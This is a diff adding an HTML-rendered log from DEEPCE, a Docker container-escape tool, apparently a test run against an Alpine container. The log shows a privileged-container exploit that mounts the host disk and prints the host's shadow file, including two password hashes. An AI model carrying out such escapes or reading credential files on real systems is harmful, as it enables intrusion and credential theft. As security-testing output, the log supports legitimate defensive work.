@@ -1,0 +1,91 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<!-- This file was created with the aha Ansi HTML Adapter. https://github.com/theZiz/aha -->
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="application/xml+xhtml; charset=UTF-8" />
+<title>results/docker-alpine-shadow.log</title>
+</head>
+<body style="color:white; background-color:black">
+<pre>
+
+<span style="font-weight:bold;">                      ##</span><span style="color:white;font-weight:bold;">         .
+                ## ## ##        ==
+             ## ## ## ##       ===
+         /&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;\___/ ===
+</span><span style="color:#3333FF;font-weight:bold;">    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  </span><span style="color:white;font-weight:bold;">===-</span><span style="color:#3333FF;font-weight:bold;"> ~~~</span>
+<span style="font-weight:bold;">         \______ X           __/
+           \    \         __/
+            \____\_______/</span>
+          __
+     ____/ /__  ___  ____  ________
+    / __  / _ \/ _ \/ __ \/ ___/ _ \ <span style="font-weight:bold;">  ENUMERATE</span>
+   / /_/ /  __/  __/ /_/ / (__/  __/ <span style="font-weight:bold;"> ESCALATE</span>
+   \__,_/\___/\___/ .___/\___/\___/<span style="font-weight:bold;">  ESCAPE</span>
+                 /_/
+
+ Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
+ by stealthcopter
+
+<span style="color:#3333FF;font-weight:bold;">==========================================</span><span style="color:lime;font-weight:bold;">( Colors )</span><span style="color:#3333FF;font-weight:bold;">==========================================</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Exploit Test ............ </span><span style="background-color:black;font-weight:bold;text-decoration:blink;">Exploitable - Check this out</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Basic Test .............. </span><span style="color:yellow;font-weight:bold;">Positive Result</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Another Test ............ </span><span style="color:red;font-weight:bold;">Error running check</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Negative Test ........... </span><span style="font-weight:bold;">No</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Multi line test ......... </span><span style="color:yellow;font-weight:bold;">Yes</span>
+<span style="font-weight:bold;">Command output
+spanning multiple lines</span>
+
+<span style="font-weight:bold;">Tips will look like this and often contains links with additional info. You can usually 
+ctrl+click links in modern terminal to open in a browser window
+See </span><span style="text-decoration:underline;font-weight:bold;">https://stealthcopter.github.io/deepce</span>
+
+<span style="color:#3333FF;font-weight:bold;">==================================</span><span style="color:lime;font-weight:bold;">( Exploiting Privileged )</span><span style="color:#3333FF;font-weight:bold;">===================================</span>
+<span style="font-weight:bold;">The container appears to be running in privilege mode, we should be able to access the 
+raw disks and mount the hosts root partition in order to gain code execution.
+See </span><span style="text-decoration:underline;font-weight:bold;">https://stealthcopter.github.io/deepce/guides/docker-privileged.md</span>
+
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Preparing Exploit </span><span style="font-weight:bold;"> </span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Exploit Type ............. </span><span style="font-weight:bold;">Print Shadow</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Clean up ................. </span><span style="font-weight:bold;">Automatic on container exit</span>
+root:*LOCK*:14600::::::
+daemon:*:18459:0:99999:7:::
+bin:*:18459:0:99999:7:::
+sys:*:18459:0:99999:7:::
+sync:*:18459:0:99999:7:::
+games:*:18459:0:99999:7:::
+man:*:18459:0:99999:7:::
+lp:*:18459:0:99999:7:::
+mail:*:18459:0:99999:7:::
+news:*:18459:0:99999:7:::
+uucp:*:18459:0:99999:7:::
+proxy:*:18459:0:99999:7:::
+www-data:*:18459:0:99999:7:::
+backup:*:18459:0:99999:7:::
+list:*:18459:0:99999:7:::
+irc:*:18459:0:99999:7:::
+gnats:*:18459:0:99999:7:::
+nobody:*:18459:0:99999:7:::
+systemd-network:*:18459:0:99999:7:::
+systemd-resolve:*:18459:0:99999:7:::
+syslog:*:18459:0:99999:7:::
+messagebus:*:18459:0:99999:7:::
+_apt:*:18459:0:99999:7:::
+lxd:*:18459:0:99999:7:::
+uuidd:*:18459:0:99999:7:::
+dnsmasq:*:18459:0:99999:7:::
+landscape:*:18459:0:99999:7:::
+sshd:*:18459:0:99999:7:::
+pollinate:*:18459:0:99999:7:::
+mysql::18469:0:99999:7:::
+postgres:*:18469:0:99999:7:::
+sbt::18469::::::
+sphinxsearch::18469:0:99999:7:::
+mongodb:*:18469:0:99999:7:::
+runneradmin:$6$Lct7dN6sJTHZ3Egf$ZtdpMsXvh82CWLojwtprzfW2.ZXKRsoA06HbTj/oVNvOvLSGFhuKTSVRzF50v/n0RAqTV0kU/NGe4azJTb9e./:18475:0:99999:7:::
+runner:*:18475:0:99999:7:::
+deepce:$6$CHpCN9uM$Nu3JJ2f4AkVlSwdD1S.vlIdYdxVGQmJpNBhn9dFmOrUFzJJ6ImtADPzGGpiHJFbRuKvoj6arctgF1fTfCP5wX1:18480:0:99999:7:::
+<span style="color:#3333FF;font-weight:bold;">===============================================</span><span style="color:lime;font-weight:bold;"></span><span style="color:#3333FF;font-weight:bold;">===============================================</span>
+</pre>
+</body>
+</html>
